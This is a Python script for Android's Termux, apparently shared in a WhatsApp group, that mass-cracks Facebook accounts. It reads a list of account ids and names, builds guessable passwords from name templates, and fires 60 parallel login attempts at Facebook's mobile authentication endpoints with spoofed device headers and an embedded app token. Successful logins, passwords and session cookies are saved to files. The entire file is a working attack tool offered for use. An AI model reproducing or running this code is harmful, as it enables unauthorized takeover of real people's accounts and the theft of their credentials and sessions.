'''
@Code written by : Mr SMILE
@WHATSAPP GROUP : https://chat.whatsapp.com/CJTqIJ2qDdz9SWvE5OVgzO
'''
#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
import os,time,sys,re,string,uuid,json,random,pycurl
from concurrent.futures import ThreadPoolExecutor as threadpol
from os import system as magi
from io import BytesIO
from urllib.parse import quote
import base64
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import uuid
import ipaddress
import calendar
import requests
import mechanize
from bs4 import BeautifulSoup
import subprocess
import base64
import platform
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a="\033[1;97m";b="\x1b[38;5;46m";c="\033[1;91m";d="\033[1;32m";e="\033[1;37m";f="\033[1;96m";g="\033[1;93m";h="\033[1;94m";i="\033[1;95m";j="\x1b[38;5;208m"
k="\x1b[38;5;91m";l="\x1b[38;5;160m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1=f"{a}[{b}1{a}]";l2=f"{a}[{b}2{a}]";l3=f"{a}[{b}3{a}]";l4=f"{a}[{b}4{a}]";l5=f"{a}[{b}5{a}]";l6=f"{a}[{b}6{a}]";l7=f"{a}[{b}7{a}]";l0=f"{a}[{c}0{a}]";ekual=f"{f}:{a}"
#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue{a}");magi("termux-setup-storage");exit()
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
DHANUline=f"{f}• ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ •"
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
loop=0
oks,cps,psw,DHANU_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
sys.stdout.write('\x1b]2; DHANU\x07')
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    print(f"""
   \x1b[38;5;57m██████\x1b[38;5;246m╗ \x1b[38;5;57m██\x1b[38;5;246m╗  \x1b[38;5;57m██\x1b[38;5;246m╗ \x1b[38;5;57m█████\x1b[38;5;246m╗ \x1b[38;5;57m███\x1b[38;5;246m╗   \x1b[38;5;57m██\x1b[38;5;246m╗\x1b[38;5;57m██\x1b[38;5;246m╗   \x1b[38;5;57m██\x1b[38;5;246m╗
   \x1b[38;5;57m██\x1b[38;5;246m╔══\x1b[38;5;57m██\x1b[38;5;246m╗\x1b[38;5;57m██\x1b[38;5;246m║  \x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m╔══\x1b[38;5;57m██\x1b[38;5;246m╗\x1b[38;5;57m████\x1b[38;5;246m╗  \x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m║   \x1b[38;5;57m██\x1b[38;5;246m║
   \x1b[38;5;159m██\x1b[38;5;246m║  \x1b[38;5;159m██\x1b[38;5;246m║\x1b[38;5;159m███████\x1b[38;5;246m║\x1b[38;5;159m███████\x1b[38;5;246m║\x1b[38;5;159m██\x1b[38;5;246m╔\x1b[38;5;159m██\x1b[38;5;246m╗ \x1b[38;5;159m██\x1b[38;5;246m║\x1b[38;5;159m██\x1b[38;5;246m║   \x1b[38;5;159m██\x1b[38;5;246m║
   \x1b[38;5;57m██\x1b[38;5;246m║  \x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m╔══\x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m╔══\x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;57m██\x1b[38;5;246m╗\x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m║   \x1b[38;5;57m██\x1b[38;5;246m║
   \x1b[38;5;57m██████\x1b[38;5;246m╔╝\x1b[38;5;57m██\x1b[38;5;246m║  \x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m║  \x1b[38;5;57m██\x1b[38;5;246m║\x1b[38;5;57m██\x1b[38;5;246m║ \x1b[38;5;246m╚\x1b[38;5;57m████\x1b[38;5;246m║\x1b[38;5;246m╚\x1b[38;5;57m██████\x1b[38;5;246m╔╝
   \x1b[38;5;246m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝
 \x1b[38;5;91m┌─────────────────────────────────────────────┐
 \x1b[38;5;91m│ \x1b[38;5;198m[♤] \x1b[38;5;174mAUTH        \x1b[38;5;198m:   \x1b[38;5;189mTHARINDU N. DHANUSHKA   \x1b[38;5;91m│
 \x1b[38;5;91m│ \x1b[38;5;198m[♤] \x1b[38;5;174mFACEBOOK    \x1b[38;5;198m:   \x1b[38;5;189mDHANU BABAA             \x1b[38;5;91m│
 \x1b[38;5;91m│ \x1b[38;5;198m[♤] \x1b[38;5;174mSTATUS      \x1b[38;5;198m:   \x1b[38;5;189mPREMIUM                 \x1b[38;5;91m│
 \x1b[38;5;91m│ \x1b[38;5;198m[♤] \x1b[38;5;174mTOOL TYPE   \x1b[38;5;198m:   \x1b[38;5;189mFILE                    \x1b[38;5;91m│
 \x1b[38;5;91m│ \x1b[38;5;198m[♤] \x1b[38;5;174mVERSION     \x1b[38;5;198m:   \x1b[38;5;189m00.00                   \x1b[38;5;91m│
 \x1b[38;5;91m└─────────────────────────────────────────────┘""")

#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def DHANU_main():
    clr_logo()
    print(f" {l1} FILE CLONING\n {l0} EXIT\n{DHANUline}")
    chic_opsn=input(f"\x1b[38;5;220mCHOOSE AN OPTION {ekual} ")
    if chic_opsn in ['1','01','A','a']:DHANU_file()
    elif chic_opsn in ['0','00','O','o']:exit()
    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);DHANU_main()
#▬▭▬▭▬▭▬▭[ DHANU FILE ]▬▭▬▭▬▭▬▭#
def DHANU_file():
    pass
    clr_logo();dmp_in=input(f"\x1b[38;5;220m  ENTER YOUR FILE EXAMPLE : \x1b[38;5;118m/sdcard/file.txt    {DHANUline} ")
    try:dmp_ck=open(dmp_in,'r').read().splitlines()
    except FileNotFoundError:print(f"{DHANUline}\n {c}File location not found\n Enter File agin...");time.sleep(4);DHANU_file()
    clr_logo()
    print(f" {l1}  CUSTOM PASS\n {l2}  AUTO PASS\n{DHANUline}")
    auto_pw = input(f" {b}CHOOSE PASS {ekual}")
    if auto_pw in ['2','02','2','b']:psw.append("firstlast123");psw.append("first1122");psw.append("last1234");psw.append("first@");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123")
    else:
        clr_logo()
        try:ps_limt=int(input(f" \x1b[38;5;220mENTER PASSWORD LIMIT {ekual} "))
        except:ps_limt = 4
        clr_logo()
        print(f" \x1b[38;5;200mEXAMPLE {ekual} \x1b[38;5;194mfirst123,firstlast,last123\n{DHANUline}")
        for x in range(ps_limt):
            inp_ps = f"\x1b[38;5;230mPASSWORD NO {f}{x+1} {ekual} "
            psw.append(input(inp_ps))
    clr_logo()
    print(f" {l1} MATHOD {f}- {b}1\n {l1} MATHOD {f}- {b}2\n{DHANUline}")
    DHANU_in_mthd = input(f"\x1b[38;5;123m CHOICE MATHOD {ekual} ")
    if DHANU_in_mthd in ['a','A','1','01']:DHANU_mthd.append("A")
    elif DHANU_in_mthd in ['b','B','2','02']:DHANU_mthd.append("B")
    else:DHANU_mthd.append("A")
    clr_logo();DHANUckki=input(f" {a}Do you went show COOKIE (y/n)?{ekual} ")
    if DHANUckki in ['y','Y','yes','Yes','1']:pmsn_ckki.append(f'y')
    else:pmsn_ckki.append(f'n')
    with threadpol(max_workers=60) as sifatx:
        clr_logo()
        total_ids = str(len(dmp_ck))
        print(f" \x1b[38;5;195mTOTAL CRACK {ekual} {total_ids}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{DHANUline}")
        for ids_nam in dmp_ck:
            try:ids,names = ids_nam.split('|')
            except:pass
            pswdx = psw
            if 'A' in DHANU_mthd:sifatx.submit(DHANU_f_m1,ids,names,pswdx)
            elif 'B' in DHANU_mthd:sifatx.submit(DHANU_f_m2,ids,names,pswdx)
    print(f"\n{DHANUline}\n\x1b[38;5;190mCREAK PROCESS HAS BEEN COMPLITE\n \x1b[38;5;190mTOTAL OK ID {ekual} {b}{str(len(oks))}\n{b} FILE SAVE AS {ekual} {a}/sdcard/DHANU-OK&CP.txt\n{DHANUline}");exit()
#▬▭▬▭▬▭▬▭[ FILE MATHID - 1 ]▬▭▬▭▬▭▬▭#
def DHANU_f_m1(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[\x1b[38;5;32mDHANU-M1{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":uaD1,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://api.facebook.com/auth/login"
            DHANU_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in DHANU_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in DHANU_respns['session_cookies'])
                print(f"\r\r [\x1b[38;5;123mDHANU-OK💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/DHANU-OK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/DHANU-OK.txt","a").write(ids+'|'+pww+'\n')
                uid=str(ids)
                oks.append(ids)
                break
            elif 'www.facebook.com' in DHANU_respns['error']['message']:
                print(f"\r\r {c}[DHANU-CP] {ids} | {pww}")
                open('/sdcard/DHANU-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[ FILE MATHID - 2 ]▬▭▬▭▬▭▬▭#
def DHANU_f_m2(ids,names,pswdx):
    try:
        global loop,oks,cps
        sys.stdout.write(f"\r\r {a}[\x1b[38;5;32mDHANU-M2{a}] {loop}{f}|{b}OK-{str(len(oks))}   {a}|{c}{str(len(cps))}{a}|");sys.stdout.flush()
        fn = names.split(' ')[0]
        try:ln = names.split(' ')[1]
        except:ln = fn
        for passx in pswdx:
            pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            ua2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/337672225;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
            logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            user_info = {"User-Agent":ua2,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            url = f"https://b-graph.facebook.com/auth/login"
            DHANU_respns = requests.post(url,data=logn_data,headers=user_info,allow_redirects=False).json()
            if 'session_key' in DHANU_respns:
                coki = ';'.join(i['name']+'='+i['value'] for i in DHANU_respns['session_cookies'])
                print(f"\r\r[\x1b[38;5;123mDHANU-OK<>💚] {ids} | {pww}")
                if 'y' in pmsn_ckki:print(f"\r\r {f}COOKIE : {coki}\n")
                open("/sdcard/DHANUOK-COOKIE.txt","a").write(ids+'|'+pww+'|'+coki+'\n')
                open("/sdcard/DHANU-OK.txt","a").write(ids+'|'+pww+'\n')
                uid=str(ids)
                oks.append(ids)
                break
            elif 'www.facebook.com' in DHANU_respns['error']['message']:
                print(f"\r\r {c}[DHANU-CP] {ids} | {pww}")
                open('/sdcard/DHANU-CP.txt','a').write(ids+'|'+pww+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(6)
    except Exception as e:pass
    
#os.system("clear")
DHANU_main()
